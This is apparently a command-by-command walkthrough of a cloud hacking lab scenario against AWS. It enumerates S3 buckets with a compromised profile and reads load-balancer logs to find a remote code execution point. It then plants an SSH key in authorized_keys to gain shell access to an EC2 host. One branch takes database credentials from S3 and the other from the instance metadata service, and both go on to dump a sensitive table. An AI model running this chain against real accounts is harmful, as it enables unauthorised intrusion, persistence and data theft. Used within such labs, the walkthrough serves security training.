`aws configure --profile Scenario5_1_user`

`aws s3 ls --profile Scenario5_1_user`

`aws s3 ls s3://<bucket> --recursive --profile Scenario5_1_user`

`aws s3 cp s3://<bucket>/sc5-lb-logs/AWSLogs/793950739751/elasticloadbalancing/eu-central-1/2019/06/19/555555555555_elasticloadbalancing_eu-central-1_app.sc5-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Scenario5_1_user`

`cat 555555555555_......_.log`

`ssh-keygen -t ed25519` (An ed25519 key pair is necessary here because using an
RSA public key is too long and gets truncated in the RCE)

`ssh-keygen -t ed25519` (An ed25519 key pair may be necessary here because using
an RSA public key can get truncated in the RCE)

`echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys`

`curl ifconfig.me`

`ssh -i private_key ubuntu@public.ip.of.ec2`

# BRANCH A:

`sudo apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt .`

`cat db.txt`

`aws rds describe-db-instances --region eu-central-1`

`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`

`\dt`

`select * from sensitive_information;`

# BRANCH B:

`curl http://169.254.169.254/latest/user-data`
`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`